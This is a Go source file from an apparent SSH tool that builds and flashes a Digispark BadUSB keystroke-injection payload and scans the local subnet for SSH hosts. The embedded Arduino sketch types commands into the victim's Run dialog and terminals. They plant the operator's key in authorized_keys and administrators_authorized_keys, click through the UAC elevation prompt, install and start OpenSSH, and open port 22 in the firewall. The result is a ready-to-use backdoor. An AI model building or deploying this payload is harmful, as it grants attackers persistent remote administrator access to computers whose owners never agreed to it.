package payload

import (
	"archive/tar"
	"archive/zip"
	"bufio"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"cross-ssh/pkg/transfer"
	"cross-ssh/pkg/vault"

	"golang.org/x/term"
)

// -----------------------------------------------------------------------------
// ANSI COLOUR CONSTANTS
// -----------------------------------------------------------------------------
const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Cyan   = "\033[36m"
	Bold   = "\033[1m"
)

// -----------------------------------------------------------------------------
// CROSS-PLATFORM TOOLCHAIN (DYNAMIC /tmp or %TEMP%)
// -----------------------------------------------------------------------------
var (
	exeSuffix = func() string {
		if runtime.GOOS == "windows" {
			return ".exe"
		}
		return ""
	}()
	cliBinaryName = "arduino-cli" + exeSuffix
)

func getTempEngineDir() string {
	return filepath.Join(os.TempDir(), "cross_payload_engine")
}

func getArduinoDownloadURL() (string, string) {
	base := "https://github.com/arduino/arduino-cli/releases/download/v1.1.1/arduino-cli_1.1.1"
	switch runtime.GOOS {
	case "linux":
		switch runtime.GOARCH {
		case "amd64":
			return base + "_Linux_64bit.tar.gz", "tar.gz"
		case "386":
			return base + "_Linux_32bit.tar.gz", "tar.gz"
		case "arm64":
			return base + "_Linux_ARM64.tar.gz", "tar.gz"
		case "arm":
			return base + "_Linux_ARMv7.tar.gz", "tar.gz"
		}
	case "darwin":
		switch runtime.GOARCH {
		case "amd64":
			return base + "_macOS_64bit.tar.gz", "tar.gz"
		case "arm64":
			return base + "_macOS_ARM64.tar.gz", "tar.gz"
		}
	case "windows":
		return base + "_Windows_64bit.zip", "zip"
	}
	return base + "_Linux_64bit.tar.gz", "tar.gz"
}

func isEngineReady() bool {
	cliPath := filepath.Join(getTempEngineDir(), cliBinaryName)
	if _, err := os.Stat(cliPath); err == nil {
		return true
	}
	if _, err := exec.LookPath(cliBinaryName); err == nil {
		return true
	}
	return false
}

// extractZip works on Windows .zip archives
func extractZip(srcZip, targetDir string) error {
	r, err := zip.OpenReader(srcZip)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		fpath := filepath.Join(targetDir, f.Name)
		if f.FileInfo().IsDir() {
			_ = os.MkdirAll(fpath, 0755)
			continue
		}
		if err := os.MkdirAll(filepath.Dir(fpath), 0755); err != nil {
			return err
		}
		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			return err
		}
		rc, err := f.Open()
		if err != nil {
			outFile.Close()
			return err
		}
		_, err = io.Copy(outFile, rc)
		outFile.Close()
		rc.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

// extractTarGz works on Linux/macOS .tar.gz archives
func extractTarGz(srcTar, targetDir string) error {
	f, err := os.Open(srcTar)
	if err != nil {
		return err
	}
	defer f.Close()

	gzr, err := gzip.NewReader(f)
	if err != nil {
		return err
	}
	defer gzr.Close()

	tr := tar.NewReader(gzr)
	for {
		header, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}

		target := filepath.Join(targetDir, header.Name)
		switch header.Typeflag {
		case tar.TypeDir:
			_ = os.MkdirAll(target, 0755)
		case tar.TypeReg:
			outFile, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
			if err != nil {
				continue
			}
			_, _ = io.Copy(outFile, tr)
			outFile.Close()
		}
	}
	return nil
}

func bootstrapTempToolchain() error {
	engineDir := getTempEngineDir()
	_ = os.MkdirAll(engineDir, 0755)

	url, ext := getArduinoDownloadURL()
	archiveName := filepath.Base(url)
	archivePath := filepath.Join(engineDir, archiveName)

	fmt.Println(Cyan + "[1/3] Downloading lightweight compiler binary directly to temp..." + Reset)
	resp, err := http.Get(url)
	if err != nil || resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to download arduino-cli runtime: %v", err)
	}
	defer resp.Body.Close()

	out, err := os.Create(archivePath)
	if err != nil {
		return err
	}
	_, err = io.Copy(out, resp.Body)
	out.Close()
	if err != nil {
		return err
	}

	fmt.Println(Cyan + "[2/3] Extracting toolchain..." + Reset)
	if ext == "zip" {
		if err := extractZip(archivePath, engineDir); err != nil {
			return err
		}
	} else {
		if err := extractTarGz(archivePath, engineDir); err != nil {
			return err
		}
	}
	_ = os.Remove(archivePath)

	cliPath := filepath.Join(engineDir, cliBinaryName)
	_ = os.Chmod(cliPath, 0755)

	fmt.Println(Cyan + "[3/3] Initializing Digispark AVR core index..." + Reset)
	configFile := filepath.Join(engineDir, "arduino-cli.yaml")
	cmdInit := exec.Command(cliPath, "config", "init", "--dest-file", configFile,
		"--additional-urls", "http://digistump.com/package_digistump_index.json")
	_ = cmdInit.Run()

	cmdUpdate := exec.Command(cliPath, "core", "update-index", "--config-file", configFile)
	_ = cmdUpdate.Run()

	fmt.Println(Green + Bold + "[✔] JIT Toolchain setup complete in temp! No permanent footprint." + Reset)
	return nil
}

func getArduinoCLIPath() string {
	tmpCli := filepath.Join(getTempEngineDir(), cliBinaryName)
	if _, err := os.Stat(tmpCli); err == nil {
		_ = os.Chmod(tmpCli, 0755)
		return tmpCli
	}
	if path, err := exec.LookPath(cliBinaryName); err == nil {
		_ = os.Chmod(path, 0755)
		return path
	}
	return ""
}

// getArduinoPort auto‑detects the Digispark serial port (cross‑platform)
func getArduinoPort(cliPath, configFile string) string {
	cmd := exec.Command(cliPath, "board", "list", "--config-file", configFile)
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		lower := strings.ToLower(line)
		if strings.Contains(lower, "digispark") || strings.Contains(lower, "micronucleus") {
			fields := strings.Fields(line)
			if len(fields) > 0 {
				if strings.Contains(fields[0], "COM") || strings.Contains(fields[0], "/dev/") {
					return fields[0]
				}
			}
		}
	}
	if runtime.GOOS == "windows" {
		return "" // let arduino-cli auto‑detect or we'll ask later
	}
	return "usb"
}

// -----------------------------------------------------------------------------
// WINDOWS DRIVER AUTO‑INSTALLER (FULLY SILENT)
// -----------------------------------------------------------------------------
func installDigisparkDriverWindows() {
	fmt.Println(Yellow + "[+] Downloading official Digispark Windows drivers..." + Reset)

	engineDir := getTempEngineDir()
	_ = os.MkdirAll(engineDir, 0755)

	driverZip := filepath.Join(engineDir, "Digistump.Drivers.zip")
	url := "https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip"

	resp, err := http.Get(url)
	if err != nil || resp.StatusCode != http.StatusOK {
		fmt.Printf(Red+"[!] Failed to download drivers: %v\n"+Reset, err)
		fmt.Println(Yellow + "[!] Please manually install drivers from: https://github.com/digistump/DigistumpArduino/releases" + Reset)
		return
	}
	defer resp.Body.Close()

	out, err := os.Create(driverZip)
	if err != nil {
		fmt.Printf(Red+"[!] Failed to save drivers: %v\n"+Reset, err)
		return
	}
	_, err = io.Copy(out, resp.Body)
	out.Close()
	if err != nil {
		fmt.Printf(Red+"[!] Failed to write drivers: %v\n"+Reset, err)
		return
	}

	fmt.Println(Yellow + "[+] Extracting driver package..." + Reset)
	extractDir := filepath.Join(engineDir, "drivers_extracted")
	_ = os.RemoveAll(extractDir)
	_ = os.MkdirAll(extractDir, 0755)

	if err := extractZip(driverZip, extractDir); err != nil {
		fmt.Printf(Red+"[!] Failed to extract drivers: %v\n"+Reset, err)
		return
	}
	_ = os.Remove(driverZip)

	var infPath string
	err = filepath.Walk(extractDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() && strings.HasSuffix(strings.ToLower(path), ".inf") {
			if strings.Contains(strings.ToLower(path), "x64") {
				infPath = path
				return filepath.SkipAll
			}
			if infPath == "" {
				infPath = path
			}
		}
		return nil
	})

	if infPath == "" {
		fmt.Println(Red + "[!] Could not locate .inf driver file in the extracted package." + Reset)
		return
	}

	fmt.Printf(Yellow+"[+] Installing driver using pnputil: %s\n"+Reset, infPath)
	cmd := exec.Command("pnputil", "-i", "-a", infPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf(Red+"[!] pnputil installation failed (Error: %v).\n"+Reset, err)
		fmt.Println(Yellow + "[!] Make sure you are running this tool as Administrator (manifest should handle it)." + Reset)
		fmt.Println(Yellow + "[!] If the device is already plugged in, unplug and re-plug it now." + Reset)
	} else {
		fmt.Println(Green + Bold + "[✔] Digispark driver successfully added to Windows Driver Store!" + Reset)
		fmt.Println(Green + "[+] If your Digispark is plugged in, it will auto-install in a few seconds." + Reset)
		fmt.Println(Green + "[+] If not, plug it in anytime and Windows will handle it automatically." + Reset)
	}
}

// -----------------------------------------------------------------------------
// CROSS‑PLATFORM SYSTEM DEPENDENCY INSTALLER
// -----------------------------------------------------------------------------
func installSystemDependencies() {
	// On Windows, the manifest forces admin. On Linux we check root.
	if runtime.GOOS == "linux" && os.Geteuid() != 0 {
		fmt.Println(Red + "[!] This operation requires root privileges on Linux." + Reset)
		fmt.Println(Yellow + "[+] Please re-run with: sudo " + os.Args[0] + Reset)
		pausePrompt()
		return
	}

	fmt.Println(Yellow + "\n[+] Installing system dependencies for Digispark compilation..." + Reset)

	switch runtime.GOOS {
	case "linux":
		// Detect package manager
		if _, err := exec.LookPath("apt-get"); err == nil {
			fmt.Println(Yellow + "[+] Detected Debian/Ubuntu (apt). Installing packages..." + Reset)
			_ = exec.Command("sudo", "apt-get", "update", "-qq").Run()
			cmd := exec.Command("sudo", "apt-get", "install", "-y", "-qq",
				"gcc-avr", "avr-libc", "libusb-0.1-4", "universal-ctags", "curl", "udev")
			cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
			_ = cmd.Run()
		} else if _, err := exec.LookPath("dnf"); err == nil {
			fmt.Println(Yellow + "[+] Detected Fedora/RHEL (dnf). Installing packages..." + Reset)
			cmd := exec.Command("sudo", "dnf", "install", "-y",
				"avr-gcc", "avr-libc", "libusb", "ctags", "curl", "systemd-udev")
			cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
			_ = cmd.Run()
		} else if _, err := exec.LookPath("yum"); err == nil {
			fmt.Println(Yellow + "[+] Detected CentOS/RHEL (yum). Installing packages..." + Reset)
			cmd := exec.Command("sudo", "yum", "install", "-y",
				"avr-gcc", "avr-libc", "libusb", "ctags", "curl", "systemd-udev")
			cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
			_ = cmd.Run()
		} else if _, err := exec.LookPath("pacman"); err == nil {
			fmt.Println(Yellow + "[+] Detected Arch Linux (pacman). Installing packages..." + Reset)
			cmd := exec.Command("sudo", "pacman", "-S", "--noconfirm",
				"avr-gcc", "avr-libc", "libusb", "ctags", "curl", "systemd")
			cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
			_ = cmd.Run()
		} else {
			fmt.Println(Yellow + "[!] No supported package manager found. Please install avr-gcc, avr-libc, and libusb manually." + Reset)
		}

		// udev rules (Linux only)
		udevPath := "/etc/udev/rules.d/49-micronucleus.rules"
		if _, err := os.Stat(udevPath); os.IsNotExist(err) {
			fmt.Println(Yellow + "[+] Writing Micronucleus udev rules..." + Reset)
			udevRule := `SUBSYSTEMS=="usb", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666"`
			_ = exec.Command("sh", "-c", fmt.Sprintf("echo '%s' | sudo tee %s", udevRule, udevPath)).Run()
			_ = exec.Command("sudo", "udevadm", "control", "--reload-rules").Run()
			_ = exec.Command("sudo", "udevadm", "trigger").Run()
		}

	case "darwin": // macOS
		if _, err := exec.LookPath("brew"); err == nil {
			fmt.Println(Yellow + "[+] Homebrew detected. Installing avr-gcc, libusb, and arp-scan..." + Reset)
			cmd := exec.Command("brew", "install", "avr-gcc", "libusb", "arp-scan")
			cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
			_ = cmd.Run()
		} else {
			fmt.Println(Yellow + "[!] Homebrew not found. Please install Homebrew first (https://brew.sh/), then run:" + Reset)
			fmt.Println("    brew install avr-gcc libusb arp-scan")
		}

	case "windows":
		installDigisparkDriverWindows()
	}

	fmt.Println(Green + Bold + "\n[✔] Dependency installation process completed." + Reset)
	pausePrompt()
}

// -----------------------------------------------------------------------------
// SUBNET SCANNING (FALLBACK PURE‑GO PING SWEEP)
// -----------------------------------------------------------------------------
func pingSweep(subnet *net.IPNet) []string {
	var ips []string
	ip := subnet.IP.Mask(subnet.Mask)
	ones, bits := subnet.Mask.Size()
	if bits-ones <= 1 {
		return ips
	}
	ipInt := uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
	maskInt := uint32(0xFFFFFFFF) << (32 - ones)
	start := ipInt & maskInt
	end := start | ^maskInt
	if end-start > 1024 {
		end = start + 1024
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	var results []string
	limit := make(chan struct{}, 100)

	for i := start + 1; i < end; i++ {
		if i == 0 || i == 0xFFFFFFFF {
			continue
		}
		wg.Add(1)
		go func(ipNum uint32) {
			defer wg.Done()
			limit <- struct{}{}
			defer func() { <-limit }()
			ipStr := fmt.Sprintf("%d.%d.%d.%d", byte(ipNum>>24), byte(ipNum>>16), byte(ipNum>>8), byte(ipNum))
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:22", ipStr), 250*time.Millisecond)
			if err == nil {
				conn.Close()
				mu.Lock()
				results = append(results, ipStr)
				mu.Unlock()
			}
		}(i)
	}
	wg.Wait()
	return results
}

// -----------------------------------------------------------------------------
// DISCOVERY & CONNECT (OPTION 4) – FULL INTERACTIVE SCANNER
// -----------------------------------------------------------------------------
func DiscoverAndConnectDigisparkNode(reader *bufio.Reader, onConnect func(ip, port, user string)) {
	vault.EnsureRootPrivileges()

	if !vault.IsEncryptionDisabled() {
		_, _ = vault.GetOrPromptMasterKey()
	}

	localSubnet := "192.168.0.0/24"
	var subnetObj *net.IPNet
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				localSubnet = ipnet.String()
				subnetObj = ipnet
				break
			}
		}
	}
	if subnetObj == nil {
		_, subnetObj, _ = net.ParseCIDR(localSubnet)
	}

	var unifiedList []vault.DiscoveredTarget
	var listMutex sync.Mutex
	lastScanTime := time.Now()
	isLiveScanning := true

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Background scanner
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				if isLiveScanning {
					var discoveredIPs []string
					var macMap map[string]string

					// Try arp-scan first (gives MACs)
					cmdArp := exec.CommandContext(ctx, "sudo", "arp-scan", "--localnet", "--quiet")
					outArp, errArp := cmdArp.Output()
					if errArp == nil && len(outArp) > 0 {
						macMap = make(map[string]string)
						lines := strings.Split(string(outArp), "\n")
						for _, l := range lines {
							fields := strings.Fields(l)
							if len(fields) >= 2 && net.ParseIP(fields[0]) != nil {
								macMap[fields[0]] = fields[1]
							}
						}
						for ip := range macMap {
							discoveredIPs = append(discoveredIPs, ip)
						}
					} else {
						// Fallback: pure-Go TCP ping sweep
						if runtime.GOOS != "windows" {
							fmt.Println(Yellow + "[!] arp-scan not found or failed. Using pure-Go TCP port 22 sweep..." + Reset)
						}
						discoveredIPs = pingSweep(subnetObj)
					}

					// Process discovered IPs
					var wg sync.WaitGroup
					for _, targetIP := range discoveredIPs {
						wg.Add(1)
						go func(ip string) {
							defer wg.Done()
							conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:22", ip), 250*time.Millisecond)
							if err != nil {
								return
							}
							conn.Close()

							mac := ""
							if macMap != nil {
								mac = macMap[ip]
							}
							devType, osType := vault.FingerprintTarget(ip, mac, "Network Device")
							alias := "Unlabeled"

							listMutex.Lock()
							found := false
							for i, t := range unifiedList {
								if t.IP == ip {
									unifiedList[i].MAC = mac
									unifiedList[i].DeviceType = devType
									unifiedList[i].OSPlatform = osType
									found = true
									break
								}
							}
							if !found {
								unifiedList = append(unifiedList, vault.DiscoveredTarget{
									IP:          ip,
									MAC:         mac,
									Alias:       alias,
									DeviceType:  devType,
									OSPlatform:  osType,
									Vendor:      "Digispark Node",
									Scope:       "Digispark",
									IsBluetooth: false,
								})
							}
							lastScanTime = time.Now()
							listMutex.Unlock()
						}(targetIP)
					}
					wg.Wait()
				}

				select {
				case <-ctx.Done():
					return
				case <-time.After(2 * time.Second):
				}
			}
		}
	}()

	// UI loop
	selectedIndex := 0
	typedNumber := ""
	tickFrame := 0
	const sweepInterval = 2.0
	secondsRemaining := sweepInterval

	oldState, errRaw := term.MakeRaw(int(os.Stdin.Fd()))
	keyChan := make(chan byte, 20)
	go func() {
		for {
			buf := make([]byte, 1)
			n, errRead := os.Stdin.Read(buf)
			if errRead != nil || n == 0 {
				return
			}
			select {
			case keyChan <- buf[0]:
			case <-ctx.Done():
				return
			}
		}
	}()

	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			if errRaw == nil {
				_ = term.Restore(int(os.Stdin.Fd()), oldState)
			}
			return
		default:
		}

		listMutex.Lock()
		activeList := make([]vault.DiscoveredTarget, len(unifiedList))
		copy(activeList, unifiedList)
		listMutex.Unlock()

		if selectedIndex >= len(activeList) && len(activeList) > 0 {
			selectedIndex = len(activeList) - 1
		}

		vault.RenderUnifiedDiscoveryTable(activeList, selectedIndex, localSubnet, lastScanTime, tickFrame, secondsRemaining, isLiveScanning, "Digispark Hardware Scanner")

		if typedNumber != "" {
			fmt.Printf("%s[Direct ID]: %s (Enter to select)%s\r\n", Yellow+Bold, typedNumber, Reset)
		} else {
			fmt.Printf("%s[Mode]: Type ID (1-%d) or Up/Down Arrows | [A] Alias | [Space] Pause%s\r\n", Cyan, len(activeList), Reset)
		}

		select {
		case <-ticker.C:
			tickFrame++
			if isLiveScanning {
				secondsRemaining -= 0.1
				if secondsRemaining <= 0 {
					secondsRemaining = sweepInterval
				}
			}
		case key := <-keyChan:
			if key == 27 {
				select {
				case k1 := <-keyChan:
					if k1 == 91 {
						select {
						case k2 := <-keyChan:
							switch k2 {
							case 65:
								if selectedIndex > 0 {
									selectedIndex--
								} else if len(activeList) > 0 {
									selectedIndex = len(activeList) - 1
								}
								typedNumber = ""
							case 66:
								if selectedIndex < len(activeList)-1 {
									selectedIndex++
								} else {
									selectedIndex = 0
								}
								typedNumber = ""
							}
						default:
						}
					}
				default:
					cancel()
					if errRaw == nil {
						_ = term.Restore(int(os.Stdin.Fd()), oldState)
					}
					return
				}
			} else if key == 's' || key == 'S' || key == ' ' {
				isLiveScanning = !isLiveScanning
				if isLiveScanning {
					secondsRemaining = sweepInterval
				}
			} else if key == 'a' || key == 'A' {
				if errRaw == nil {
					_ = term.Restore(int(os.Stdin.Fd()), oldState)
				}
				if len(activeList) > 0 && selectedIndex < len(activeList) {
					listMutex.Lock()
					selectedHost := activeList[selectedIndex]
					listMutex.Unlock()
					fmt.Printf(Cyan+Bold+"\n=== SET ALIAS FOR [%s] ===\n"+Reset, selectedHost.IP)
					newAlias := transfer.ReadRealtimeInput("Enter Custom Alias: ")
					if strings.TrimSpace(newAlias) != "" {
						listMutex.Lock()
						for i, ul := range unifiedList {
							if ul.IP == selectedHost.IP {
								unifiedList[i].Alias = newAlias
							}
						}
						listMutex.Unlock()
						fmt.Printf(Green+Bold+"[✔] Alias [%s] assigned.\n"+Reset, newAlias)
						time.Sleep(1 * time.Second)
					}
				}
				oldState, _ = term.MakeRaw(int(os.Stdin.Fd()))
			} else if key == 13 || key == 10 {
				if typedNumber != "" {
					if num, errNum := strconv.Atoi(typedNumber); errNum == nil && num >= 1 && num <= len(activeList) {
						selectedIndex = num - 1
					}
				}
				cancel()
				if errRaw == nil {
					_ = term.Restore(int(os.Stdin.Fd()), oldState)
				}
				if len(activeList) > 0 && selectedIndex < len(activeList) {
					listMutex.Lock()
					selectedHost := activeList[selectedIndex]
					listMutex.Unlock()
					if onConnect != nil {
						onConnect(selectedHost.IP, "22", "root")
					}
					return
				}
				return
			} else if key == '0' || key == 'q' || key == 'Q' || key == 3 {
				cancel()
				if errRaw == nil {
					_ = term.Restore(int(os.Stdin.Fd()), oldState)
				}
				return
			} else if key >= '0' && key <= '9' {
				typedNumber += string(key)
				if num, errNum := strconv.Atoi(typedNumber); errNum == nil && num >= 1 && num <= len(activeList) {
					selectedIndex = num - 1
				}
			} else if key == 127 || key == 8 {
				if len(typedNumber) > 0 {
					typedNumber = typedNumber[:len(typedNumber)-1]
				}
			}
		}
	}
}

// -----------------------------------------------------------------------------
// SSH KEY HELPERS
// -----------------------------------------------------------------------------
func getLocalPublicKey() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	paths := []string{
		filepath.Join(home, ".ssh", "id_ed25519.pub"),
		filepath.Join(home, ".ssh", "id_rsa.pub"),
	}
	for _, p := range paths {
		if data, err := os.ReadFile(p); err == nil {
			return strings.TrimSpace(string(data))
		}
	}
	return ""
}

func generateLocalSSHKey() string {
	home, _ := os.UserHomeDir()
	keyPath := filepath.Join(home, ".ssh", "id_ed25519")
	_ = os.MkdirAll(filepath.Join(home, ".ssh"), 0700)
	cmd := exec.Command("ssh-keygen", "-t", "ed25519", "-C", "digispark-auto-key", "-f", keyPath, "-N", "")
	if err := cmd.Run(); err != nil {
		return ""
	}
	data, err := os.ReadFile(keyPath + ".pub")
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

// -----------------------------------------------------------------------------
// BUILD & FLASH PAYLOAD (OPTIONS 1 & 2)
// -----------------------------------------------------------------------------
func buildAndFlashPayload(reader *bufio.Reader, pubKey string) {
	vault.EnsureRootPrivileges()

	fmt.Println(Cyan + "\n=== BUILDING DIGISPARK C++ PAYLOAD SKETCH ===" + Reset)
	fmt.Printf(Yellow+"Bound Public Key: %s\n"+Reset, pubKey)

	if !isEngineReady() {
		fmt.Println(Yellow + "[+] Toolchain not ready. Bootstrapping now..." + Reset)
		if err := bootstrapTempToolchain(); err != nil {
			fmt.Printf(Red+"[!] Failed to bootstrap: %v\n"+Reset, err)
			pausePrompt()
			return
		}
	}

	cliPath := getArduinoCLIPath()
	if cliPath == "" {
		fmt.Println(Red + "[!] arduino-cli missing. Aborting." + Reset)
		return
	}
	engineDir := getTempEngineDir()
	configFile := filepath.Join(engineDir, "arduino-cli.yaml")

	home, _ := os.UserHomeDir()
	buildDir := filepath.Join(home, ".cross-ssh", "build_digispark")
	_ = os.RemoveAll(buildDir)
	_ = os.MkdirAll(buildDir, 0755)

	sketchContent := fmt.Sprintf(`#include "DigiKeyboard.h"

#ifndef KEY_LEFT_ARROW
#define KEY_LEFT_ARROW 0x50
#endif

const char* KALI_SSH_KEY = "%s";
const char* DS_TAG = " # DIGISPARK-PROVISIONED-NODE";

void setup() {}

void loop() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(0);

  // STAGE 1: WINDOWS AUTO-ELEVATION, KEY INJECTION & FIREWALL UNBLOCK
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1800);
  DigiKeyboard.print(F("cmd /c \"mkdir %%USERPROFILE%%\\.ssh 2>nul & echo "));
  DigiKeyboard.print(KALI_SSH_KEY);
  DigiKeyboard.print(DS_TAG);
  DigiKeyboard.println(F(" > %%USERPROFILE%%\\.ssh\\authorized_keys\""));
  DigiKeyboard.delay(1500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1800);
  DigiKeyboard.println(F("powershell -Command \"Start-Process powershell -Verb RunAs\""));
  DigiKeyboard.delay(2200);

  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);

  DigiKeyboard.print(F("Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue; $k='"));
  DigiKeyboard.print(KALI_SSH_KEY);
  DigiKeyboard.println(F(" # DIGISPARK-PROVISIONED-NODE'; $p='C:\\ProgramData\\ssh'; if(-not (Test-Path $p)){ New-Item -ItemType Directory -Path $p -Force }; Set-Content -Path \"$p\\administrators_authorized_keys\" -Value $k; icacls \"$p\\administrators_authorized_keys\" /grant \"SYSTEM:F\" /grant \"Administrators:F\" | Out-Null; $u=\"$env:USERPROFILE\\.ssh\"; if(-not (Test-Path $u)){ New-Item -ItemType Directory -Path $u -Force }; Set-Content -Path \"$u\\authorized_keys\" -Value $k; $cfg=\"$p\\sshd_config\"; if(Test-Path $cfg){ (Get-Content $cfg) -replace 'Match Group administrators', '# Match Group administrators' -replace 'AuthorizedKeysFile __PROGRAMDATA__', '# AuthorizedKeysFile __PROGRAMDATA__' | Set-Content $cfg }; Remove-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue; New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -Profile Any -ErrorAction SilentlyContinue; Set-Service sshd -StartupType Automatic; Start-Service sshd; Restart-Service sshd; exit"));

  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(0);

  // STAGE 2: PARROT OS / KALI / UBUNTU / DEBIAN MULTI-LAUNCHER PROVISIONING
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1800);

  DigiKeyboard.print(F("mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '"));
  DigiKeyboard.print(KALI_SSH_KEY);
  DigiKeyboard.print(DS_TAG);
  DigiKeyboard.println(F("' > ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && touch ~/.digispark.id && (sudo systemctl enable --now ssh || sudo systemctl enable --now sshd)"));

  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
  DigiKeyboard.delay(1800);

  DigiKeyboard.print(F("bash -c \"mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '"));
  DigiKeyboard.print(KALI_SSH_KEY);
  DigiKeyboard.print(DS_TAG);
  DigiKeyboard.println(F("' > ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && touch ~/.digispark.id && (sudo systemctl enable --now ssh || sudo systemctl enable --now sshd)\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1200);
  DigiKeyboard.println(F("x-terminal-emulator"));
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '"));
  DigiKeyboard.print(KALI_SSH_KEY);
  DigiKeyboard.print(DS_TAG);
  DigiKeyboard.println(F("' > ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && (sudo systemctl enable --now ssh || sudo systemctl enable --now sshd) && exit"));

  for (;;) {
    DigiKeyboard.delay(5000);
  }
}
`, pubKey)

	inoFile := filepath.Join(buildDir, "build_digispark.ino")
	if err := os.WriteFile(inoFile, []byte(sketchContent), 0644); err != nil {
		fmt.Printf(Red+"[!] Failed creating sketch: %v\n"+Reset, err)
		return
	}

	fmt.Println(Yellow + "[+] Compiling sketch..." + Reset)
	compileCmd := exec.Command(cliPath, "compile", "--config-file", configFile, "--fqbn", "digistump:avr:digispark-tiny", buildDir)
	compileCmd.Stdout = os.Stdout
	compileCmd.Stderr = os.Stderr

	if err := compileCmd.Run(); err != nil {
		fmt.Println(Yellow + "[!] Compile failed. Attempting core install..." + Reset)
		installCoreCmd := exec.Command(cliPath, "core", "install", "digistump:avr", "--config-file", configFile)
		installCoreCmd.Stdout = os.Stdout
		installCoreCmd.Stderr = os.Stderr
		if errCore := installCoreCmd.Run(); errCore != nil {
			fmt.Printf(Red+"[!] Core install failed: %v\n"+Reset, errCore)
			return
		}
		if errRetry := compileCmd.Run(); errRetry != nil {
			fmt.Printf(Red+"[!] Retry failed: %v\n"+Reset, errRetry)
			return
		}
	}

	fmt.Println(Green + Bold + "\n==================================================================" + Reset)
	fmt.Println(Green + Bold + " [READY TO FLASH] PLUG IN YOUR DIGISPARK USB DEVICE NOW..." + Reset)
	fmt.Println(Green + Bold + "==================================================================" + Reset)

	// Cross-platform port detection
	port := getArduinoPort(cliPath, configFile)
	uploadArgs := []string{"upload", "--config-file", configFile, "--fqbn", "digistump:avr:digispark-tiny"}
	if port != "" {
		uploadArgs = append(uploadArgs, "-p", port)
	} else if runtime.GOOS == "windows" {
		fmt.Println(Yellow + "[!] Could not auto-detect COM port. Please enter it manually (e.g., COM3):" + Reset)
		portManual := transfer.ReadRealtimeInput("Port: ")
		if portManual != "" {
			uploadArgs = append(uploadArgs, "-p", portManual)
		}
	}
	uploadArgs = append(uploadArgs, buildDir)

	uploadCmd := exec.Command(cliPath, uploadArgs...)
	uploadCmd.Stdout = os.Stdout
	uploadCmd.Stderr = os.Stderr
	_ = uploadCmd.Run()

	fmt.Println(Green + Bold + "\n[SUCCESS] Hardware Token Flashed Successfully!" + Reset)
	pausePrompt()
}

// -----------------------------------------------------------------------------
// MAIN MENU (OPTION 9)
